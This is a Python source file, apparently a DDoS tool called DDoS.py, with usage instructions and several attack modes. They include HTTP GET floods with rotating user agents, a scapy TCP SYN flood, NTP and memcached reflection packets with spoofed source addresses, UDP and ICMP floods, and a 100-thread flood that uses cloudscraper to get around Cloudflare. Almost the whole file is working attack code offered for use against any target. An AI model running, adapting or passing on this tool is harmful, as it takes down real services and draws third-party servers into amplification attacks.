import cloudscraper
import requests
import threading
import time
import random
import os
import socket
import sys
from scapy.all import *
from requests.structures import CaseInsensitiveDict
from time import sleep
b = 0 
user_agent_list = [
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36',
'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)',
'Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)',
'Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)',
'Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)',
'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)',
'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)',
'Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10',
'BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)',
'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; Acoo Browser; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; Avant Browser)',
'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; acc=baadshah; acc=none; freenet DSL 1.1; (none))',
'Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)'
]
website = str(sys.argv[1])
if website == "-h":
	print("""Usage:
_______________________________________________
sudo python3 DDoS.py https://www.target.com 1
_______________________________________________
sudo python3 DDoS.py 1.1.1.1 4
_______________________________________________
methods: 

1.Nginx
2.Cloudfare
3.GET
4.TCP
5.NTP
6.UDP
7.DNS (memcached packet)
8.ICMP""")
	exit()
url = website
fff = str(sys.argv[2])
if int(fff) == 1:
	while True:
		print("""
Requests sent:
| """ + str(b)  + """ |""")
		b = b + 1
		for i in range(1,20):
			user_agent = random.choice(user_agent_list)
		headers = CaseInsensitiveDict()
		headers["Connection"] = "keep-alive"
		headers["Keep-Alive"] = "timeout=5, max=100"
		headers = {'User-Agent': user_agent}
		response = requests.get(url, headers=headers)		
		response
		os.system("clear")
rand = 0
if int(fff) == 3:
	r = requests.get(website)
	os.system("clear")
	print("Note, request counter isn't laggy, it was made to update every 5498392 requests so that it doesn't hog computing power") 
	while True:
		rand = rand + 1
		r.status_code
		b = b + 1
		if rand == 5498392:
			os.system("clear")
			print("""
Requests sent:
| """ + str(b)  + """ |""")
			rand = 0
if int(fff) == 4:
	target_ip = website
	target_port = 80
	ip = IP(dst=target_ip)
	tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
	raw = Raw(b"X"*1024)
	test232 = 0
	p = ip / tcp / raw
	while True:
		send(p, verbose=0)
		test232 = test232 + 1
		print(str(test232) + " packets sent")
if int(fff) == 5:
	test232 = 0
	target = website
	ntpserver = website
	data = "\x17\x00\x03\x2a" + "\x00" * 4
	packet = IP(dst=ntpserver,src=target)/UDP(sport=48947,dport=123)/Raw(load=data) 
	while True:
		send(packet, verbose=0)
		test232 = test232 + 1
		print(str(test232) + " packets sent")
	exit()
if int(fff) == 6:
	DESTINATION_IP = website
	DESTINATION_PORT = 80
	udp_socket = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
	payload_hex_string = "68656c6c6f5f776f726c64" #hello_world
	payload = bytes.fromhex(payload_hex_string)
	test232 = 0
	while True:
		test232 = test232 + 1
		print(str(test232) + " packets sent")
		udp_socket.sendto(payload,(DESTINATION_IP,DESTINATION_PORT))
if int(fff) == 7:
	test232 = 0
	target = url
	ip = target
	payload = '\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n'
	while True:
		test232 = test232 + 1
		print(str(test232) + " packets sent")
		send(IP(src=target, dst=ip) / UDP(dport=11211) / Raw(load=payload), count=100, verbose=0)
if int(fff) == 8:
	test232 = 0
	while True:
		request = IP(dst=url)/ICMP()
		send(request, verbose=0)
		test232 = test232 + 1
		print(str(test232) + " packets sent")
	
def check_url(url):
	try:
		cloudfare_check_url = requests.Session()
		response = cloudfare_check_url.get(url)
		if response.status_code == 200:
			print("[INFO] The url is valid")
		elif response.status_code == 404:
			print("[INFO] The url is invalid")
	except:
		bypass = cloudscraper.create_scraper()
		response2 = bypass.get(url)
		if response2.status_code == 200:
			print("[INFO]The url is valid")
		elif response2.status_code == 404:
			print("[INFO] The url is invalid")

count = 0

# ddos cloudfare
def bypass(url, threads):

	r = requests.Session()
	bypass2 = cloudscraper.create_scraper()

	def do_req():
		global count
		while True:
			response = r.get(url)
			count +=1
			print("\n" + f"[ATTACK] Status code: {response.status_code} Request number: {count}" + "\n")

			response = bypass2.get(url)
			print("\n" + f"[ATTACK]Status code: {response.status_code} Request number: {count}" + "\n")

	list_of_threads = []

	for i in range(int(threads)):
		t = threading.Thread(target=do_req)
		t.daemon = True
		list_of_threads.append(t)

	for i in range(int(threads)):
		list_of_threads[i].start()

	for i in range(int(threads)):
		list_of_threads[i].join()

check_url(url)
sleep(1)

threads = 100
bypass(url, threads)
